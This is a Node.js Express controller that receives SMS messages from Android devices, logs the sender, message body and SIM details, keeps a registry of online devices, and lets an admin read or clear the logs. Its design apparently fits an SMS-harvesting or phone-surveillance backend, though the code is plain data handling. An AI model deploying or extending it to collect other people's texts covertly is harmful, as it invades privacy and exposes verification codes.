const SmsLog = require('../models/SmsLog');
const Device = require('../models/Device');

// @desc    Create new SMS log
// @route   POST /api/sms
// @access  Private
const createSmsLog = async (req, res) => {
    try {
        const { device_id, sender, message_body, timestamp, sim_info, device_model, android_version } = req.body;

        if (!device_id || !sender || !message_body || !timestamp || !sim_info) {
            console.log("Missing fields:", req.body);
            return res.status(400).json({ message: 'Please provide all fields' });
        }

        console.log(`Received SMS from ${device_id}: ${sender}`);

        // 1. Create SMS Log
        const smsLog = await SmsLog.create({
            device_id,
            sender,
            message_body,
            timestamp,
            sim_info,
            device_model,
            android_version
        });

        // 2. Update or Register Device
        // We use upsert to create if not exists
        try {
            await Device.findOneAndUpdate(
                { device_id }, // Filter by Unique device_id
                {
                    $set: {
                        model: device_model || 'Unknown Device',
                        android_version: android_version,
                        last_seen: new Date(),
                        socket_id: req.body.socket_id || '' // Optional
                    },
                    $setOnInsert: {
                        is_online: true,
                        name: device_model || `Device-${device_id.slice(-4)}`
                    }
                },
                { upsert: true, new: true, setDefaultsOnInsert: true }
            );
        } catch (deviceError) {
            console.error('Error updating device registry:', deviceError.message);
            // We do NOT return error here, as SMS log is already saved.
            // But we log it for debugging.
        }

        res.status(201).json(smsLog);
    } catch (error) {
        console.error("Error in createSmsLog:", error);
        res.status(500).json({ message: 'Server Error saving SMS' });
    }
};

// @desc    Get all SMS logs
// @route   GET /api/sms
// @access  Private (Admin)
const getSmsLogs = async (req, res) => {
    const logs = await SmsLog.find({}).sort({ timestamp: -1 });
    res.json(logs);
};

// @desc    Clear SMS logs for a specific device
// @route   DELETE /api/sms/:deviceId
// @access  Private (Admin)
const clearSmsLogs = async (req, res) => {
    const { deviceId } = req.params;

    if (!deviceId) return res.status(400).json({ message: 'Device ID required' });

    try {
        await SmsLog.deleteMany({ device_id: deviceId });
        res.json({ message: `Logs cleared for device: ${deviceId}` });
    } catch (error) {
        res.status(500).json({ message: 'Server Error' });
    }
};

module.exports = { createSmsLog, getSmsLogs, clearSmsLogs };
